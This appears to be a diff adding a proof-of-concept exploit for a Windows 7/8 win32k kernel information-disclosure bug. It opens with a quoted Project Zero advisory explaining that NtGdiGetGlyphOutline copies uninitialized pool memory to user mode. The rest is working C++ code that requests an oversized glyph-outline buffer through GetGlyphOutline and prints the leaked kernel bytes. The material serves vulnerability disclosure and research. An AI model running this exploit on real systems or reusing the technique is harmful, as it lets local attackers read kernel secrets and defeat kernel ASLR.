@@ -1,0 +1,126 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1267&desc=2
+
+We have discovered that the win32k!NtGdiGetGlyphOutline system call handler may disclose large portions of uninitialized pool memory to user-mode clients.
+
+The function first allocates memory (using win32k!AllocFreeTmpBuffer) with a user-controlled size, then fills it with the outline data via win32k!GreGetGlyphOutlineInternal, and lastly copies the entire buffer back into user-mode address space. If the amount of data written by win32k!GreGetGlyphOutlineInternal is smaller than the size of the allocated memory region, the remaining part will stay uninitialized and will be copied in this form to the ring-3 client.
+
+The bug can be triggered through the official GetGlyphOutline() API, which is a simple wrapper around the affected system call. The information disclosure is particularly severe because it allows the attacker to leak an arbitrary number of bytes from an arbitrarily-sized allocation, potentially enabling them to "collide" with certain interesting objects in memory.
+
+Please note that the win32k!AllocFreeTmpBuffer routine works by first attempting to return a static block of 4096 bytes (win32k!gpTmpGlobalFree) for optimization, and only when it is already busy, a regular pool allocation is made. As a result, the attached PoC program will dump the contents of that memory region in most instances. However, if we enable the Special Pools mechanism for win32k.sys and start the program in a loop, we will occasionally see output similar to the following (for 64 leaked bytes). The repeated 0x67 byte in this case is the random marker inserted by Special Pools.
+
+--- cut ---
+00000000: 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 gggggggggggggggg
+00000010: 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 gggggggggggggggg
+00000020: 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 gggggggggggggggg
+00000030: 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 67 gggggggggggggggg
+--- cut ---
+
+Interestingly, the bug is only present on Windows 7 and 8. On Windows 10, the following memset() call was added:
+
+--- cut ---
+.text:0018DD88 loc_18DD88:                             ; CODE XREF: NtGdiGetGlyphOutline(x,x,x,x,x,x,x,x)+5D
+.text:0018DD88                 push    ebx             ; size_t
+.text:0018DD89                 push    0               ; int
+.text:0018DD8B                 push    esi             ; void *
+.text:0018DD8C                 call    _memset
+--- cut ---
+
+The above code pads the overall memory area with zeros, thus preventing any kind of information disclosure. This suggests that the issue was identified internally by Microsoft but only fixed in Windows 10 and not backported to earlier versions of the system.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      } else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      } else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main(int argc, char **argv) {
+  if (argc < 2) {
+    printf("Usage: %s <number of bytes to leak>\n", argv[0]);
+    return 1;
+  }
+
+  UINT NumberOfLeakedBytes = strtoul(argv[1], NULL, 0);
+
+  // Create a Device Context.
+  HDC hdc = CreateCompatibleDC(NULL);
+
+  // Create a TrueType font.
+  HFONT hfont = CreateFont(1,                   // nHeight
+                           1,                   // nWidth
+                           0,                   // nEscapement
+                           0,                   // nOrientation
+                           FW_DONTCARE,         // fnWeight
+                           FALSE,               // fdwItalic
+                           FALSE,               // fdwUnderline
+                           FALSE,               // fdwStrikeOut
+                           ANSI_CHARSET,        // fdwCharSet
+                           OUT_DEFAULT_PRECIS,  // fdwOutputPrecision
+                           CLIP_DEFAULT_PRECIS, // fdwClipPrecision
+                           DEFAULT_QUALITY,     // fdwQuality
+                           FF_DONTCARE,         // fdwPitchAndFamily
+                           L"Times New Roman");
+
+  // Select the font into the DC.
+  SelectObject(hdc, hfont);
+
+  // Get the glyph outline length.
+  GLYPHMETRICS gm;
+  MAT2 mat2 = { 0, 1, 0, 0, 0, 0, 0, 1 };
+  DWORD OutlineLength = GetGlyphOutline(hdc, 'A', GGO_BITMAP, &gm, 0, NULL, &mat2);
+  if (OutlineLength == GDI_ERROR) {
+    printf("[-] GetGlyphOutline#1 failed.\n");
+
+    DeleteObject(hfont);
+    DeleteDC(hdc);
+    return 1;
+  }
+
+  // Allocate memory for the outline + leaked data.
+  PBYTE OutputBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, OutlineLength + NumberOfLeakedBytes);
+
+  // Fill the buffer with uninitialized pool memory from the kernel.
+  OutlineLength = GetGlyphOutline(hdc, 'A', GGO_BITMAP, &gm, OutlineLength + NumberOfLeakedBytes, OutputBuffer, &mat2);
+  if (OutlineLength == GDI_ERROR) {
+    printf("[-] GetGlyphOutline#2 failed.\n");
+
+    HeapFree(GetProcessHeap(), 0, OutputBuffer);
+    DeleteObject(hfont);
+    DeleteDC(hdc);
+    return 1;
+  }
+
+  // Print the disclosed bytes on screen.
+  PrintHex(&OutputBuffer[OutlineLength], NumberOfLeakedBytes);
+
+  // Free resources.
+  HeapFree(GetProcessHeap(), 0, OutputBuffer);
+  DeleteObject(hfont);
+  DeleteDC(hdc);
+
+  return 0;
+}
